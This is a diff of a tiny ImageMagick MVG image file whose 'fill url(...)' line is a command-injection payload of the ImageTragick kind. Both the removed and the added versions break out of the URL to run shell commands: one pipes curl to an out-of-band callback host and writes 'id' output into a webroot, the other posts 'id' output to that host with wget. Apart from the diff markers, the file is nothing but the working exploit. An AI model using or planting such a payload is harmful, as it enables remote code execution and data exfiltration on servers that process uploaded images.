@@ -1,4 +1,4 @@
 push graphic-context
 viewbox 0 0 640 480
-fill 'url(https://example.com/x.jpg"| curl -s http://ldthejoidhdzgmyaryuq08s5ybn5vua68.oast.fun/mvg-25da4473b4 | id > /mainData/webroot/qtamween/1.txt)'
+fill 'url(https://example.com/x.jpg"|id|wget -q -O /dev/null --post-data=@- http://ldthejoidhdzgmyaryuq08s5ybn5vua68.oast.fun/mvg-25da4473b4")'
 pop graphic-context
